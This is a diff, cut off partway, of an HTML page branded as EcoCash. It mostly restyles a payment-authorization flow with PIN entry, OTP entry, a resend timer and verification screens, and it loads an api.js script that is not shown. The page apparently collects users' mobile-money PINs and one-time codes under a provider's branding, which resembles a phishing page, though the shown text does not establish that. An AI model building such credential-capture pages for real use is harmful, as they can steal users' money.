@@ -4,308 +4,210 @@
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
 <meta name="theme-color" content="#005F8E"/>
-<title>Verify · EcoCash</title>
+<title>Authorize · EcoCash</title>
 <link rel="icon" href="assets/econet.png">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,600;9..40,700&family=DM+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <style>
-*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 :root{
-  --blue:  #005F8E;
-  --blue2: #004470;
-  --blue3: #003558;
-  --cyan:  #00C2FF;
-  --cdim:  rgba(0,194,255,.12);
-  --bg:    #EFF4FA;
-  --card:  #FFFFFF;
-  --line:  rgba(0,95,142,.1);
-  --t1:    #0F172A;
-  --t2:    #334155;
-  --t3:    #64748B;
-  --t4:    #94A3B8;
-  --ok:    #10B981;
-  --warn:  #F59E0B;
-  --err:   #EF4444;
-  --vc:    #E8335A;
-  --sc:    #7C3AED;
-  --dc:    #0284C7;
-  --f:     'DM Sans',system-ui,sans-serif;
-  --fm:    'DM Mono',monospace;
-  --rp: 999px; --r12:12px; --r16:16px; --r20:20px; --r24:24px;
-  --sp:   cubic-bezier(.34,1.56,.64,1);
-  --ease: cubic-bezier(.2,0,0,1);
+  --blue:#005F8E;--blue2:#004470;--blue3:#003558;
+  --cyan:#00C2FF;--cdim:rgba(0,194,255,.12);
+  --bg:#F2F6FA;--card:#FFFFFF;--line:rgba(0,0,0,.07);
+  --t1:#0A1628;--t2:#2D3F55;--t3:#5C7088;--t4:#9BAABB;
+  --ok:#10B981;--err:#EF4444;
+  --f:'DM Sans',system-ui,sans-serif;--fm:'DM Mono',monospace;
+  --rp:999px;--r12:12px;--r16:16px;--r20:20px;--r24:24px;
+  --sp:cubic-bezier(.34,1.56,.64,1);--ease:cubic-bezier(.2,0,0,1);
+  --elev1:0 1px 3px rgba(0,0,0,.08),0 1px 2px rgba(0,0,0,.05);
+  --elev2:0 4px 16px rgba(0,0,0,.1),0 2px 6px rgba(0,0,0,.06);
 }
+@media(prefers-reduced-motion:reduce){*{animation-duration:.01ms!important;transition-duration:.01ms!important}}
+html,body{width:100%;height:100dvh;overflow:hidden;font-family:var(--f);background:var(--blue);color:var(--t1);-webkit-font-smoothing:antialiased}
 
-html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(--f);background:var(--blue);color:var(--t1)}
-.screen{display:grid;grid-template-rows:auto 1fr auto auto;width:100%;height:100%;height:100dvh;overflow:hidden;position:relative}
-@keyframes fadeUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
-@keyframes fadeOut{from{opacity:1}to{opacity:0;transform:translateY(-8px)}}
-.screen{animation:fadeUp .3s cubic-bezier(.2,0,0,1) both}
-.screen.exit{animation:fadeOut .22s forwards}
-
-/* ── CURTAIN ── */
-.curtain{position:fixed;inset:0;z-index:9999;pointer-events:none;background:var(--blue);opacity:0;transition:opacity .22s;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:22px}
-.curtain.show{opacity:1;pointer-events:auto}
-.curtain-brand{display:flex;align-items:center;gap:10px;padding:8px 18px;border-radius:var(--rp);background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.1)}
-.curtain-brand img{height:17px;object-fit:contain;filter:brightness(0) invert(1)}
-.curtain-brand-sep{width:1px;height:13px;background:rgba(255,255,255,.2)}
-.curtain-spinner svg{animation:spin 1s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
-.curtain-txt{text-align:center}
-.c-lbl{font-size:15px;font-weight:500;color:#fff;margin-bottom:2px;transition:opacity .18s}
-.c-sub{font-size:13px;color:rgba(255,255,255,.48);transition:opacity .18s}
-.curtain-bar{width:180px;height:2px;background:rgba(255,255,255,.1);border-radius:var(--rp);overflow:hidden;margin-top:6px}
-.curtain-fill{height:100%;background:var(--cyan);animation:cFill 1.6s cubic-bezier(.4,0,.2,1) both}
-@keyframes cFill{from{width:0}to{width:100%}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
+@keyframes fadeOut{to{opacity:0;transform:translateY(-8px)}}
+@keyframes stepIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
 
-/* ── HEADER ── */
-.hdr{flex-shrink:0;background:var(--blue);padding:max(14px,env(safe-area-inset-top)) 18px 14px;position:relative;z-index:10}
-.hdr-row{display:flex;align-items:center;gap:10px}
-.back-btn{width:38px;height:38px;border-radius:50%;border:none;background:rgba(255,255,255,.09);cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:background .14s}
-.back-btn:active{background:rgba(255,255,255,.18)}
-.back-btn svg{width:18px;height:18px;stroke:#fff;stroke-width:2;fill:none;stroke-linecap:round;stroke-linejoin:round}
+/* ── Curtain ── */
+.curtain{position:fixed;inset:0;z-index:9999;pointer-events:none;background:var(--blue);opacity:0;transition:opacity .25s;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:24px}
+.curtain.show{opacity:1;pointer-events:auto}
+.c-logo{display:flex;align-items:center;gap:10px;padding:8px 20px;border-radius:var(--rp);background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.15)}
+.c-logo img{height:16px;object-fit:contain;filter:brightness(0)invert(1)}
+.c-logo-sep{width:1px;height:12px;background:rgba(255,255,255,.3)}
+.c-spinner{width:36px;height:36px;border:3px solid rgba(255,255,255,.15);border-top-color:var(--cyan);border-radius:50%;animation:spin .8s linear infinite}
+.c-txt{text-align:center}
+.c-lbl{font-size:15px;font-weight:600;color:#fff;margin-bottom:3px;transition:opacity .18s}
+.c-sub{font-size:12px;color:rgba(255,255,255,.5);transition:opacity .18s}
+
+/* ── Screen ── */
+.screen{display:grid;grid-template-rows:auto 1fr auto;width:100%;height:100dvh;overflow:hidden;animation:fadeUp .28s var(--ease) both}
+.screen.exit{animation:fadeOut .2s var(--ease) forwards}
+
+/* ── Header ── */
+.hdr{
+  flex-shrink:0;
+  background:linear-gradient(180deg,var(--blue3) 0%,var(--blue) 100%);
+  padding:max(14px,env(safe-area-inset-top)) 18px 20px;
+  position:relative;overflow:hidden;
+}
+.hdr::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 260px 160px at 100% -20%,rgba(0,194,255,.08),transparent);pointer-events:none}
+.hdr-row{display:flex;align-items:center;gap:10px;margin-bottom:18px;position:relative;z-index:1}
+.back-btn{width:38px;height:38px;border-radius:50%;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.15);cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;outline:none;transition:background .12s}
+.back-btn:active{background:rgba(255,255,255,.2);transform:scale(.92)}
+.back-btn svg{width:18px;height:18px;stroke:#fff;stroke-width:2.2;fill:none;stroke-linecap:round;stroke-linejoin:round}
 .brand{display:flex;align-items:center;gap:10px}
-.brand img{height:17px;object-fit:contain;filter:brightness(0) invert(1)}
-.brand-sep{width:1px;height:13px;background:rgba(255,255,255,.22)}
-.amt-chip{margin-left:auto;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.16);padding:6px 13px;border-radius:var(--rp);font-family:var(--mono);font-size:13px;font-weight:700;color:#fff;font-feature-settings:"tnum"}
-.bchips{display:flex;gap:6px;flex-wrap:wrap;padding-top:10px}
-.bchip{background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.11);padding:3px 10px;border-radius:var(--rp);font-size:11px;font-weight:500;color:rgba(255,255,255,.65);font-family:var(--mono)}
+.brand img{height:17px;object-fit:contain;filter:brightness(0)invert(1)}
+.brand-sep{width:1px;height:13px;background:rgba(255,255,255,.25)}
+.hdr-amt{margin-left:auto;font-family:var(--fm);font-size:15px;font-weight:700;color:#fff;background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.2);padding:6px 14px;border-radius:var(--rp)}
 
-/* ── LAYOUT: scroll area + fixed bottom bar ── */
-.body{overflow-y:auto;overflow-x:hidden;padding:16px 16px 16px;min-height:0;scrollbar-width:none;overscroll-behavior:contain;background:var(--bg);border-radius:24px 24px 0 0;margin-top:-1px}
+/* Auth summary */
+.auth-summary{position:relative;z-index:1}
+.auth-eyebrow{font-size:10px;font-weight:700;color:rgba(255,255,255,.4);text-transform:uppercase;letter-spacing:.8px;margin-bottom:4px}
+.auth-title{font-size:20px;font-weight:700;color:#fff;letter-spacing:-.3px;margin-bottom:12px;line-height:1.2}
+.auth-chips{display:flex;gap:6px;flex-wrap:wrap}
+.auth-chip{background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.15);padding:5px 12px;border-radius:var(--rp);font-size:11px;font-weight:600;color:rgba(255,255,255,.8);font-family:var(--fm)}
+.auth-chip.highlight{background:rgba(0,194,255,.15);border-color:rgba(0,194,255,.3);color:var(--cyan)}
 
+/* ── Body ── */
+.body{overflow-y:auto;overflow-x:hidden;padding:16px 16px 8px;min-height:0;scrollbar-width:none;overscroll-behavior:contain;background:var(--bg);border-radius:24px 24px 0 0;margin-top:-1px}
+.body::-webkit-scrollbar{display:none}
 
-.action-btn{
-  width:100%;padding:16px;border-radius:var(--rp);border:none;
-  background:var(--blue);color:#fff;
-  font-family:var(--f);font-size:15px;font-weight:700;
-  cursor:pointer;letter-spacing:.01em;
-  box-shadow:0 4px 16px rgba(0,95,142,.3);
-  transition:box-shadow .15s,transform .12s;
-  position:relative;overflow:hidden;min-height:52px;
-}
-.action-btn:active{transform:scale(.97);box-shadow:0 2px 8px rgba(0,95,142,.2)}
-.action-btn:disabled{opacity:.45;cursor:default;transform:none}
+.step{display:none;flex-direction:column;gap:12px;padding-bottom:16px}
+.step.active{display:flex;animation:stepIn .22s var(--ease)}
 
-/* Steps */
-.step{display:none;flex-direction:column;gap:14px;padding-bottom:16px}
-.step.active{display:flex;animation:fadeUp .24s cubic-bezier(.2,0,0,1)}
+/* ── Cards ── */
+.card{background:var(--card);border-radius:var(--r16);border:1px solid var(--line);box-shadow:var(--elev1);overflow:hidden}
+.card-hdr{padding:14px 16px;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:10px}
+.card-hdr-icon{width:32px;height:32px;border-radius:10px;background:linear-gradient(135deg,var(--blue),var(--blue2));display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.card-hdr-icon svg{width:15px;height:15px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round}
+.card-title{font-size:15px;font-weight:700;color:var(--t1);letter-spacing:-.1px}
+.card-sub{font-size:12px;color:var(--t3);margin-top:1px}
+.card-body{padding:16px;display:flex;flex-direction:column;gap:14px}
 
-/* ── CARD ── */
-.card{background:var(--card);border-radius:var(--r16);border:1px solid var(--line);box-shadow:var(--sh);overflow:hidden}
-.card-hdr{padding:16px;border-bottom:1px solid var(--line)}
-.card-title{font-size:16px;font-weight:700;color:var(--t1);letter-spacing:-.1px}
-.card-sub{font-size:13px;color:var(--t2);margin-top:2px}
-.card-body{padding:16px;display:flex;flex-direction:column;gap:16px}
+/* Auth detail rows */
+.detail-card{background:var(--card);border-radius:var(--r16);border:1px solid var(--line);box-shadow:var(--elev1);overflow:hidden}
+.detail-header{background:linear-gradient(135deg,var(--blue) 0%,var(--blue2) 100%);padding:14px 16px;display:flex;align-items:center;justify-content:space-between}
+.detail-header-label{font-size:11px;font-weight:600;color:rgba(255,255,255,.5);text-transform:uppercase;letter-spacing:.6px}
+.detail-header-amt{font-family:var(--fm);font-size:20px;font-weight:700;color:#fff;letter-spacing:-.02em}
+.detail-row{display:flex;align-items:center;gap:12px;padding:12px 16px;border-bottom:1px solid var(--line)}
+.detail-row:last-child{border-bottom:none}
+.detail-row-icon{width:34px;height:34px;border-radius:10px;background:var(--bg);display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0}
+.detail-row-key{font-size:11px;font-weight:700;color:var(--t4);text-transform:uppercase;letter-spacing:.5px;margin-bottom:2px}
+.detail-row-val{font-size:13px;font-weight:700;color:var(--t1)}
 
-/* ── PAY INFO ── */
-.pay-info{background:var(--card);border-radius:var(--r16);border:1px solid var(--line);box-shadow:var(--sh);padding:14px;display:flex;align-items:center;gap:14px;border-left:4px solid var(--ok)}
-.pay-logo{height:26px;object-fit:contain;flex-shrink:0}
-.pay-title{font-size:14px;font-weight:700;color:var(--t1)}
-.pay-sub{font-size:12px;color:var(--t4);margin-top:2px}
-.pay-badges{display:flex;gap:6px;margin-top:8px;flex-wrap:wrap}
-.pbadge{font-size:10px;font-weight:500;padding:3px 8px;border-radius:var(--rp)}
-.pbadge-g{background:#DCFCE7;color:#15803D;border:1px solid #86EFAC}
-.pbadge-b{background:var(--cyan-dim);color:#0284C7;border:1px solid rgba(0,194,255,.25)}
-.pbadge-y{background:#FEF9C3;color:#B45309;border:1px solid #FDE68A}
-
-/* ── FIELDS ── */
-.field-label{font-size:12px;font-weight:500;color:var(--t2);margin-bottom:6px;letter-spacing:.15px;transition:color .15s}
-.field:focus-within .field-label{color:var(--blue)}
-.outlined{border:1.5px solid var(--line);border-radius:var(--r12);background:var(--card);display:flex;align-items:center;transition:border-color .15s,box-shadow .15s;overflow:hidden}
-.outlined:focus-within{border-color:var(--cyan);box-shadow:0 0 0 3px var(--cyan-dim)}
-.outlined.err{border-color:var(--err)}
-.prefix{padding:0 12px;display:flex;align-items:center;gap:6px;border-right:1.5px solid var(--line);height:54px;flex-shrink:0;background:var(--bg)}
-.prefix-flag{font-size:18px;line-height:1}
-.prefix-code{font-family:var(--mono);font-size:13px;color:var(--t2)}
-.outlined input{flex:1;height:54px;border:none;outline:none;padding:0 16px;background:transparent;font-family:var(--f);font-size:16px;color:var(--t1)}
-.outlined input::placeholder{color:var(--t4);opacity:.7}
-.fhelper{font-size:11px;color:var(--t4);margin-top:4px}
-.ferr{font-size:12px;color:var(--err);margin-top:4px;display:none}
-.ferr.show{display:block}
-
-
-/* ═══════════ PIN — CLEAN REWRITE ═══════════ */
-.pin-label{font-size:12px;font-weight:500;color:var(--t2);margin-bottom:6px;letter-spacing:.15px;transition:color .15s}
-.pin-wrap{
-  background:var(--bg);
-  border:1.5px solid var(--line);
-  border-radius:var(--r12);
-  padding:16px;
-  position:relative;
-  cursor:pointer;
-  transition:border-color .15s,box-shadow .15s;
-  display:flex;flex-direction:column;align-items:center;gap:10px;
-  user-select:none;-webkit-user-select:none;
-}
-.pin-wrap.focused{border-color:var(--cyan);box-shadow:0 0 0 3px var(--cdim)}
-.pin-wrap.err{border-color:var(--err)}
-/* Invisible input — covers entire wrap, captures all taps */
-.pin-hidden{
-  position:absolute;inset:0;z-index:5;
-  width:100%;height:100%;
-  opacity:0;border:none;background:none;outline:none;
-  cursor:pointer;font-size:16px;caret-color:transparent;
-  -webkit-user-select:text;user-select:text;
-}
-/* Hint text */
-.pin-tap{font-size:12px;color:var(--t4);text-align:center;line-height:1.4}
-/* Dot row — centred */
-.pin-dots{display:flex;gap:10px;justify-content:center}
-/* Individual dot cell */
-.pin-dot{
-  width:52px;height:52px;
-  border-radius:var(--r12);
-  border:1.5px solid var(--line);
-  background:var(--card);
-  display:flex;align-items:center;justify-content:center;
-  transition:border-color .18s,background .18s,transform .15s var(--sp);
-  flex-shrink:0;position:relative;overflow:hidden;
-}
-/* Filled state: blue border + filled circle indicator */
-.pin-dot.filled{
-  border-color:var(--blue);
-  background:rgba(0,95,142,.05);
-  transform:scale(1.04);
-}
-.pin-dot.filled::after{
-  content:'';display:block;
-  width:12px;height:12px;border-radius:50%;
-  background:var(--blue);
-}
-/* Active (cursor) state */
-.pin-dot.active{
-  border-color:var(--cyan);border-width:2px;
-  transform:scale(1.06);
-  box-shadow:0 0 0 3px var(--cdim);
-}
-/* Peek: hide the circle, show digit text */
+/* PIN */
+.pin-label{font-size:12px;font-weight:600;color:var(--t3);margin-bottom:8px;letter-spacing:.2px}
+.pin-wrap{background:var(--bg);border:2px solid var(--line);border-radius:var(--r12);padding:16px;cursor:pointer;transition:border-color .15s,box-shadow .15s;display:flex;flex-direction:column;align-items:center;gap:12px;position:relative;user-select:none;-webkit-user-select:none}
+.pin-wrap.focused{border-color:var(--blue);box-shadow:0 0 0 3px rgba(0,95,142,.1)}
+.pin-wrap.error{border-color:var(--err);box-shadow:0 0 0 3px rgba(239,68,68,.08)}
+.pin-hidden{position:absolute;inset:0;z-index:5;width:100%;height:100%;opacity:0;border:none;background:none;outline:none;cursor:pointer;font-size:16px;caret-color:transparent;-webkit-user-select:text;user-select:text}
+.pin-hint{font-size:12px;color:var(--t4);text-align:center}
+.pin-dots{display:flex;gap:12px;justify-content:center}
+.pin-dot{width:52px;height:52px;border-radius:14px;border:2px solid var(--line);background:var(--card);display:flex;align-items:center;justify-content:center;transition:all .18s;position:relative;overflow:hidden;box-shadow:var(--elev1)}
+.pin-dot.filled{border-color:var(--blue);background:rgba(0,95,142,.06);transform:scale(1.06)}
+.pin-dot.filled::after{content:'';display:block;width:13px;height:13px;border-radius:50%;background:var(--blue)}
+.pin-dot.active{border-color:var(--cyan);border-width:2px;transform:scale(1.08);box-shadow:0 0 0 3px var(--cdim)}
 .pin-dot.peek::after{display:none!important}
-.pin-digit{
-  position:absolute;inset:0;
-  display:none;align-items:center;justify-content:center;
-  font-family:var(--fm);font-size:20px;font-weight:700;
-  color:var(--blue);line-height:1;pointer-events:none;
-}
+.pin-digit{position:absolute;inset:0;display:none;align-items:center;justify-content:center;font-family:var(--fm);font-size:20px;font-weight:700;color:var(--blue);pointer-events:none}
 .pin-dot.peek .pin-digit{display:flex}
-/* Action buttons row */
-.pin-actions{
-  display:flex;gap:10px;justify-content:center;
-  z-index:6;position:relative;
-}
-.pin-btn{
-  font-size:12px;font-weight:600;color:var(--blue);
-  background:rgba(0,95,142,.06);border:1px solid rgba(0,95,142,.15);
-  border-radius:var(--rp);padding:6px 14px;
-  cursor:pointer;display:flex;align-items:center;gap:5px;
-  transition:background .13s;
-}
-.pin-btn:active{background:rgba(0,95,142,.12)}
-.pin-btn svg{display:block;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round}
-/* ═══════════════════════════════════════════ */
-/* ── SECURITY ROW ── */
-.sec-row{display:flex;align-items:center;justify-content:center;gap:16px;padding:10px 0 4px;border-top:1px solid var(--line)}
-.sec-item{display:flex;align-items:center;gap:4px;font-size:10px;font-weight:500;color:var(--t4)}
-.sec-item svg{width:11px;height:11px;stroke:var(--t4);stroke-width:2.5;stroke-linecap:round;fill:none}
-.powered{text-align:center;padding:6px 0 2px;font-size:10px;color:var(--t4);letter-spacing:.3px}
+.pin-actions{display:flex;gap:8px;justify-content:center}
+.pin-btn{font-size:12px;font-weight:600;color:var(--blue);background:rgba(0,95,142,.07);border:1px solid rgba(0,95,142,.15);border-radius:var(--rp);padding:6px 16px;cursor:pointer;display:flex;align-items:center;gap:5px;transition:background .12s;font-family:var(--f)}
+.pin-btn:active{background:rgba(0,95,142,.14)}
+.pin-btn svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;display:block}
 
-/* ── VERIFY ── */
-.verify-card{background:var(--card);border-radius:var(--r16);border:1px solid var(--line);box-shadow:var(--sh);overflow:hidden}
-.verify-body{display:flex;flex-direction:column;align-items:center;padding:44px 24px 32px;text-align:center}
-.ring-wrap{width:72px;height:72px;margin-bottom:20px;position:relative}
-.ring-svg{width:72px;height:72px;animation:spin 1s linear infinite}
+/* Security row */
+.sec-badges{display:flex;align-items:center;justify-content:center;gap:14px;padding:10px 0;border-top:1px solid var(--line)}
+.sec-badge{display:flex;align-items:center;gap:4px;font-size:10px;font-weight:600;color:var(--t4)}
+.sec-badge svg{width:11px;height:11px;stroke:var(--t4);stroke-width:2.5;stroke-linecap:round;fill:none}
+.powered{text-align:center;padding:4px 0 0;font-size:10px;color:var(--t4);letter-spacing:.3px}
+
+/* api error */
+.api-err{background:#FEF2F2;border:1px solid rgba(239,68,68,.15);border-radius:var(--r12);padding:12px 14px;font-size:13px;color:var(--err);display:none;line-height:1.5}
+.api-err.show{display:block}
+
+/* ── Verify step ── */
+.verify-card{background:var(--card);border-radius:var(--r16);border:1px solid var(--line);box-shadow:var(--elev1);overflow:hidden}
+.verify-body{display:flex;flex-direction:column;align-items:center;padding:44px 24px 32px;text-align:center;gap:0}
+.ring-wrap{width:68px;height:68px;margin-bottom:20px;position:relative}
+.ring-svg{width:68px;height:68px;animation:spin .9s linear infinite}
 .ring-svg.done{animation:none}
-.ring-arc{stroke-dasharray:66;stroke-dashoffset:66;transition:stroke-dashoffset .6s,stroke .4s}
+.ring-arc{stroke-dasharray:64;stroke-dashoffset:64;transition:stroke-dashoffset .6s,stroke .4s}
 .ring-svg.done .ring-arc{stroke-dashoffset:0;stroke:var(--ok)}
 .ring-icon{position:absolute;inset:0;display:flex;align-items:center;justify-content:center}
 .ring-icon svg{transition:stroke .4s}
 .ring-icon.done svg{stroke:var(--ok)}
-.v-title{font-size:18px;font-weight:700;color:var(--t1);letter-spacing:-.2px;margin-bottom:6px;transition:opacity .2s}
-.v-sub{font-size:14px;color:var(--t2);line-height:1.6;margin-bottom:24px;transition:opacity .2s}
-.v-steps{display:flex;align-items:center;width:100%;max-width:280px}
+.v-title{font-size:17px;font-weight:700;color:var(--t1);letter-spacing:-.2px;margin-bottom:6px;transition:opacity .2s}
+.v-sub{font-size:13px;color:var(--t3);line-height:1.6;margin-bottom:24px;transition:opacity .2s}
+.vsteps{display:flex;align-items:center;width:100%;max-width:260px}
 .vstep{display:flex;flex-direction:column;align-items:center;gap:4px;flex:0 0 auto}
-.vstep-dot{width:10px;height:10px;border-radius:50%;background:var(--line);transition:background .3s,transform .3s,box-shadow .3s}
-.vstep.active .vstep-dot{background:var(--cyan);transform:scale(1.3);box-shadow:0 0 0 3px var(--cyan-dim)}
+.vstep-dot{width:10px;height:10px;border-radius:50%;background:var(--line);transition:all .3s}
+.vstep.active .vstep-dot{background:var(--cyan);transform:scale(1.3);box-shadow:0 0 0 3px var(--cdim)}
 .vstep.done .vstep-dot{background:var(--ok)}
-.vstep-txt{font-size:10px;font-weight:500;color:var(--t4);text-transform:uppercase;letter-spacing:.5px;white-space:nowrap;transition:color .3s}
+.vstep-txt{font-size:9px;font-weight:600;color:var(--t4);text-transform:uppercase;letter-spacing:.5px;white-space:nowrap;transition:color .3s}
 .vstep.active .vstep-txt{color:var(--blue)}
 .vstep.done .vstep-txt{color:var(--ok)}
 .vstep-line{flex:1;height:2px;background:var(--line);margin-bottom:14px;position:relative;overflow:hidden}
 .vstep-line::after{content:'';position:absolute;inset:0;background:var(--ok);transform:scaleX(0);transform-origin:left;transition:transform .4s}
 .vstep-line.done::after{transform:scaleX(1)}
 
-/* ── OTP ── */
+/* ── OTP step ── */
 .otp-wrap{position:relative;height:64px;margin-bottom:8px}
 .otp-hidden{position:absolute;inset:0;opacity:0;cursor:pointer;font-size:16px;z-index:2;border:none;background:none;outline:none;caret-color:transparent;width:100%;height:100%}
 .otp-row{display:flex;gap:8px;height:100%}
-.otp-box{flex:1;height:100%;border-radius:var(--r12);border:1.5px solid var(--line);background:var(--card);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:22px;font-weight:700;color:var(--t1);transition:border-color .15s,background .15s,transform .14s cubic-bezier(.34,1.56,.64,1);position:relative;overflow:hidden}
-.otp-box.filled{background:#EFF6FF;border-color:var(--blue);transform:scale(1.04)}
-.otp-box.active{border-color:var(--cyan);border-width:2px;box-shadow:0 0 0 3px var(--cyan-dim)}
-.otp-box.active.empty::after{content:'';position:absolute;width:1.5px;height:55%;background:var(--cyan);border-radius:2px;animation:blink 1s ease-in-out infinite}
+.otp-box{flex:1;height:100%;border-radius:var(--r12);border:2px solid var(--line);background:var(--card);display:flex;align-items:center;justify-content:center;font-family:var(--fm);font-size:22px;font-weight:700;color:var(--t1);transition:all .15s var(--sp);position:relative;overflow:hidden;box-shadow:var(--elev1)}
+.otp-box.filled{background:#EFF6FF;border-color:var(--blue);transform:scale(1.05)}
+.otp-box.active{border-color:var(--cyan);border-width:2px;box-shadow:0 0 0 3px var(--cdim)}
+.otp-box.active.empty::after{content:'';position:absolute;width:2px;height:52%;background:var(--cyan);border-radius:2px;animation:blink 1s ease-in-out infinite}
 @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
-.otp-row.shake{animation:shake .36s cubic-bezier(.36,.07,.19,.97)}
+.otp-row.shake{animation:shake .32s cubic-bezier(.36,.07,.19,.97)}
 @keyframes shake{0%,100%{transform:translateX(0)}25%,75%{transform:translateX(-6px)}50%{transform:translateX(6px)}}
 .timer-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0 0}
 .timer-lbl{font-size:13px;color:var(--t2)}
-.timer-num{font-family:var(--mono);font-weight:700;color:var(--blue);font-feature-settings:"tnum"}
-.resend-btn{font-size:13px;font-weight:600;color:var(--t4);background:none;border:none;cursor:default;padding:4px 8px;border-radius:var(--r12);transition:all .15s}
-.resend-btn.active{color:var(--blue);cursor:pointer}
-.resend-btn.active:active{background:var(--cyan-dim)}
-.masked-note{font-size:13px;color:var(--t2);margin-bottom:12px}
-.masked-note strong{color:var(--t1);font-weight:600}
+.timer-num{font-family:var(--fm);font-weight:700;color:var(--blue);font-feature-settings:"tnum"}
+.resend-btn{font-size:13px;font-weight:700;color:var(--t4);background:none;border:none;cursor:default;padding:6px 10px;border-radius:var(--r12);transition:all .15s;font-family:var(--f)}
+.resend-btn.active{color:var(--blue);cursor:pointer;background:rgba(0,95,142,.07)}
+.masked-note{font-size:13px;color:var(--t2);margin-bottom:14px;line-height:1.5}
+.masked-note strong{color:var(--t1);font-weight:700;font-family:var(--fm)}
 
-/* ── RIPPLE ── */
-.rip-el{position:absolute;border-radius:50%;pointer-events:none;background:rgba(255,255,255,.25);transform:scale(0);animation:ripple .5s cubic-bezier(.4,0,.2,1) forwards}
-@keyframes ripple{to{transform:scale(4);opacity:0}}
-
-/* ── OTP TOAST ── */
-.otp-toast{position:fixed;top:max(16px,env(safe-area-inset-top));left:50%;transform:translateX(-50%) translateY(-80px);background:var(--blue);color:#fff;border-radius:24px;padding:12px 16px;display:flex;align-items:center;gap:12px;box-shadow:0 8px 32px rgba(0,0,0,.2);min-width:260px;z-index:1000;transition:transform .3s cubic-bezier(.2,0,0,1);border:1px solid rgba(255,255,255,.08)}
+/* OTP toast */
+.otp-toast{position:fixed;top:max(16px,env(safe-area-inset-top));left:50%;transform:translateX(-50%) translateY(-90px);background:var(--t1);color:#fff;border-radius:20px;padding:12px 18px;display:flex;align-items:center;gap:12px;box-shadow:0 8px 32px rgba(0,0,0,.22);min-width:250px;z-index:1000;transition:transform .3s var(--ease)}
 .otp-toast.show{transform:translateX(-50%) translateY(0)}
-.otp-toast-icon{width:34px;height:34px;border-radius:50%;background:var(--cyan-dim);border:1px solid rgba(0,194,255,.25);display:flex;align-items:center;justify-content:center;flex-shrink:0}
-.otp-toast-icon svg{width:17px;height:17px;stroke:var(--cyan);stroke-width:2;fill:none;stroke-linecap:round;stroke-linejoin:round}
+.otp-toast-icon{width:32px;height:32px;border-radius:50%;background:rgba(0,194,255,.15);border:1px solid rgba(0,194,255,.3);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.otp-toast-icon svg{width:16px;height:16px;stroke:var(--cyan);stroke-width:2;fill:none;stroke-linecap:round}
 .otp-toast-title{font-size:13px;font-weight:700;color:#fff}
-.otp-toast-sub{font-size:12px;color:rgba(255,255,255,.5);margin-top:2px}
-.otp-toast-sub strong{color:rgba(255,255,255,.8);font-family:var(--mono)}
+.otp-toast-sub{font-size:11px;color:rgba(255,255,255,.5);margin-top:1px}
+.otp-toast-sub strong{color:rgba(255,255,255,.8);font-family:var(--fm)}
 
-/* ── STICKY ACTION BAR ── */
-.action-bar{
-  flex-shrink:0;
-  padding:10px 16px max(20px,env(safe-area-inset-bottom));
-  background:var(--card);
-  border-top:1px solid var(--line);
-}
-.action-bar .action-btn{ margin:0 }
+/* ripple */
+.rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(255,255,255,.25);transform:scale(0);animation:ripAnim .5s ease forwards}
+@keyframes ripAnim{to{transform:scale(4);opacity:0}}
+
+/* ── Action bar ── */
+.action-bar{flex-shrink:0;padding:10px 16px max(20px,env(safe-area-inset-bottom));background:rgba(242,246,250,.97);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border-top:1px solid var(--line)}
+.action-btn{width:100%;min-height:52px;padding:14px;border-radius:var(--r16);border:none;background:linear-gradient(135deg,var(--blue) 0%,var(--blue2) 100%);color:#fff;font-family:var(--f);font-size:15px;font-weight:700;cursor:pointer;box-shadow:0 4px 18px rgba(0,95,142,.32);transition:transform .14s var(--sp),box-shadow .15s;position:relative;overflow:hidden;outline:none}
+.action-btn:active{transform:scale(.97);box-shadow:0 2px 8px rgba(0,95,142,.2)}
+.action-btn:disabled{background:linear-gradient(135deg,#B0C4D8,#98AFCA);box-shadow:none;cursor:default;transform:none;opacity:.7}
 </style>
 </head>
 <body>
+<script src="api.js"></script>
 
-<!-- CURTAIN -->
+<!-- Curtain -->
 <div class="curtain" id="curtain">
-  <div class="curtain-brand">
-    <img src="assets/econet.png" alt="Econet">
-    <div class="curtain-brand-sep"></div>
-    <img src="assets/ecocash.png" alt="EcoCash">
-  </div>
-  <div class="curtain-spinner">
-    <svg width="44" height="44" viewBox="0 0 44 44" fill="none">
